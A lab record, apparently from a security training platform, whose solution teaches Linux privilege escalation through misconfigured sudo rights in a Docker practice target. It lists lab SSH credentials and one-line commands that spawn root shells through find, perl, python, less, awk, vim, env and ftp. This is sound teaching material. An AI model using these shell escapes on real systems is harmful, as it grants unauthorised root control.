{"description":"Privilege escalation exploiting misconfigurations of sudo rights","goal":"<p>Explore various methods to escalate privileges on a linux machine exploiting misconfigurations of sudo privileges</p>\n<p>This Lab was modeled after the following article:&nbsp;<a href=\"https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/\">https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/</a></p>","solution":"<p>First off, if you do not already have it, go ahead and grab our lightweight ssh client hack tool. <br />In a terminal on your host, type:</p>\n<p style=\"padding-left: 30px;\">$ docker pull nsunina/alpine_ssh:latest</p>\n<p>&nbsp;</p>\n<p>Start the lab and follow the standard procedure to attach an interactive hack tool. This will allow you to interact with the vulnerable environment.</p>\n<p>Create a new interactive service in the Hack Tool tab: name it \"ssh_client\", select \"nsunina/alpine_ssh:latest\" as base docker image and run it.</p>\n<p>&nbsp;<img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L_EXTRA_PrivilegeEscalation_PATH/.images/1.png\" alt=\"\" width=\"1367\" height=\"626\" /></p>\n<p>As soon as the container is up and running, attach it to the target network:</p>\n<p>&nbsp;<img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L_EXTRA_PrivilegeEscalation_PATH/.images/2.png\" alt=\"\" width=\"425\" height=\"123\" /></p>\n<p>Then, access the web shell.</p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L_EXTRA_PrivilegeEscalation_PATH/.images/3.png\" alt=\"\" width=\"277\" height=\"112\" /></p>\n<p>Connect to the vulnerable container via SSH as an unprivileged user. In reality, you will have to compromise the target machine and get remote access, before applying any of the following techniques.</p>\n<p style=\"padding-left: 30px;\">$ ssh <a href=\"mailto:user1@193.20.1.2\">user1@193.20.1.2</a></p>\n<p>The password is \"pass123\".</p>\n<h3>Sudo rights</h3>\n<p><span style=\"color: #000000;\">The word sudo stands for <span style=\"color: #800000;\"><strong>S</strong>uper <strong>U</strong>ser <strong>D</strong>o <em>root_privilege_task</em>. <br /></span></span></p>\n<p><br /><span style=\"color: #000000;\"><span style=\"color: #000000;\">In Linux/Unix, a sudoers file inside /etc holds the configuration to grant sudo rights to specific users.</span></span></p>\n<p><span style=\"color: #000000;\"><span style=\"color: #000000;\">Sudo allows a system administrator to delegate authority to give certain users&mdash;or groups of users&mdash;the ability to run commands as root or another user. </span></span></p>\n<p><span style=\"color: #000000;\"><span style=\"color: #000000;\"><span style=\"color: #000000;\">When any command is executed along with sudo, it requires root privileges: Linux checks whether that particular username is specified in the sudoers file. If the current user is not among the sudoers, the command can not be executed with sudo. As per sudo rights the root user can execute from <strong>ALL terminals</strong>, acting as <strong>ALL users</strong>: <strong>ALL group</strong>, and run <strong>ALL command</strong>.</span></span></span></p>\n<p><span style=\"color: #000000;\"><span style=\"color: #000000;\"><span style=\"color: #000000;\">The syntax used in the sudoers file to grant sudo rights to specific users is the following:</span></span></span></p>\n<p><span style=\"color: #000000;\"><span style=\"color: #000000;\"><span style=\"color: #000000;\"><img src=\"https://i.imgur.com/IVf7tx5.png\" alt=\"\" width=\"547\" height=\"325\" /></span></span></span></p>\n<h3><span style=\"color: #000000;\"><span style=\"color: #000000;\"><span style=\"color: #000000;\">Privilege Escalation</span></span></span></h3>\n<p><span style=\"color: #000000;\"><span style=\"color: #000000;\"><span style=\"color: #000000;\">On our target machine, we can check the sudo rights of the current user with the following command:</span></span></span></p>\n<p style=\"padding-left: 30px;\"><span style=\"color: #000000;\"><span style=\"color: #000000;\"><span style=\"color: #000000;\">$ sudo -l</span></span></span></p>\n<p><span style=\"color: #000000;\"><span style=\"color: #000000;\"><span style=\"color: #000000;\"><img src=\"https://i.imgur.com/2g3ISuY.png\" alt=\"\" width=\"1757\" height=\"128\" /></span></span></span></p>\n<p><span style=\"color: #000000;\"><span style=\"color: #000000;\"><span style=\"color: #000000;\">As you can see, user1 has the permissions to run a bunch of linux built-in utilities as well as some custom scripts as root user, without typing in any password.</span></span></span></p>\n<p><span style=\"color: #000000;\"><span style=\"color: #000000;\"><span style=\"color: #000000;\">Some of these look harmless, but we'll see how each one of them has a way around it, that brings to the execution of nasty code.</span></span></span></p>\n<p><strong><span style=\"color: #000000;\"><span style=\"color: #000000;\"><span style=\"color: #000000;\">/usr/bin/find</span></span></span></strong></p>\n<p><span style=\"color: #000000;\"><span style=\"color: #000000;\"><span style=\"color: #000000;\">The \"find\" utility has an \"exec\" option that allows to execute a command. Let's try it out with a shell.</span></span></span></p>\n<p style=\"padding-left: 30px;\"><span style=\"color: #000000;\"><span style=\"color: #000000;\"><span style=\"color: #000000;\">$ </span></span></span><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">find</span> <span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span> <span class=\"crayon-o\">-</span><span class=\"crayon-v\">exec</span> <span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">bash</span> <span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">;</span></p>\n<p><span class=\"crayon-sy\"><img src=\"https://i.imgur.com/w0tjrr9.png\" alt=\"\" width=\"518\" height=\"56\" /></span></p>\n<p><strong><span class=\"crayon-sy\">/usr/bin/perl</span></strong></p>\n<p style=\"padding-left: 30px;\"><span class=\"crayon-sy\">$ </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">perl</span> <span class=\"crayon-o\">-</span><span class=\"crayon-i\">e</span> <span class=\"crayon-s\">'exec \"/bin/bash\";'</span></p>\n<p><span class=\"crayon-s\"><img src=\"https://i.imgur.com/jtLv9uY.png\" alt=\"\" width=\"494\" height=\"53\" /></span></p>\n<p><strong><span class=\"crayon-s\">/usr/bin/python</span></strong></p>\n<p style=\"padding-left: 30px;\"><span class=\"crayon-s\">$ </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">python</span> <span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span> <span class=\"crayon-s\">'import pty;pty.spawn(\"/bin/bash\")'</span></p>\n<p><span class=\"crayon-s\"><img src=\"https://i.imgur.com/r0nxDRa.png\" alt=\"\" width=\"653\" height=\"53\" /></span></p>\n<p><strong><span class=\"crayon-s\">/usr/bin/less</span></strong></p>\n<p style=\"padding-left: 30px;\"><span class=\"crayon-s\">$ </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">less</span> <span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">hosts</span></p>\n<p style=\"padding-left: 30px;\"><span class=\"crayon-v\">$ !bash</span></p>\n<p><span class=\"crayon-v\"><img src=\"https://i.imgur.com/cMBKDLU.png\" alt=\"\" width=\"404\" height=\"155\" /></span></p>\n<p><span class=\"crayon-v\"><img src=\"https://i.imgur.com/rkmhcJZ.png\" alt=\"\" width=\"395\" height=\"55\" /></span></p>\n<p><strong><span class=\"crayon-v\">/usr/bin/awk</span></strong></p>\n<p style=\"padding-left: 30px;\"><span class=\"crayon-v\">$ </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-i\">awk</span> <span class=\"crayon-s\">'BEGIN {system(\"/bin/bash\")}'</span></p>\n<p><span class=\"crayon-s\"><img src=\"https://i.imgur.com/jTKSfJQ.png\" alt=\"\" width=\"543\" height=\"53\" /></span></p>\n<p><strong><span class=\"crayon-s\">/usr/bin/vim</span></strong></p>\n<p style=\"padding-left: 30px;\"><span class=\"crayon-s\">$ sudo vim<br /></span></p>\n<p style=\"padding-left: 30px;\"><span class=\"crayon-s\">$ :!bash</span></p>\n<p><span class=\"crayon-s\"><img src=\"https://i.imgur.com/6a3bWc7.png\" alt=\"\" width=\"294\" height=\"120\" /></span></p>\n<p><span class=\"crayon-s\"><img src=\"https://i.imgur.com/nIEaZjr.png\" alt=\"\" width=\"462\" height=\"111\" /></span></p>\n<p><strong><span class=\"crayon-s\">/usr/bin/env</span></strong></p>\n<p style=\"padding-left: 30px;\"><span class=\"crayon-s\">$ sudo env /bin/bash<br /></span></p>\n<p><span class=\"crayon-s\"><img src=\"https://i.imgur.com/ovsDgOr.png\" alt=\"\" width=\"551\" height=\"80\" /></span></p>\n<p><strong><span class=\"crayon-s\">/usr/bin/ftp</span></strong></p>\n<p style=\"padding-left: 30px;\"><span class=\"crayon-s\">$ sudo ftp<br /></span></p>\n<p style=\"padding-left: 30px;\"><span class=\"crayon-s\">$ ! /bin/bash</span></p>\n<p><span class=\"crayon-s\"><img src=\"https://i.imgur.com/DznVWCu.png\" alt=\"\" width=\"434\" height=\"105\" /></span></p>\n<p><span class=\"crayon-s\">Sometimes it might be even easier than you would think, because it is not rare to find cases where the administrator grants sudo privileges for custom scripts that already execute shells.</span></p>\n<p><span class=\"crayon-s\">This is the case of the scripts in the root folder (asroot.sh, shell). Try them out with sudo and see what happens!</span></p>\n<p>&nbsp;</p>\n<p style=\"padding-left: 30px;\">&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p style=\"padding-left: 30px;\">&nbsp;</p>\n<p style=\"padding-left: 30px;\">&nbsp;</p>\n<p style=\"padding-left: 30px;\">&nbsp;</p>","readme":"","difficulty":"Advanced","author":"NS"}
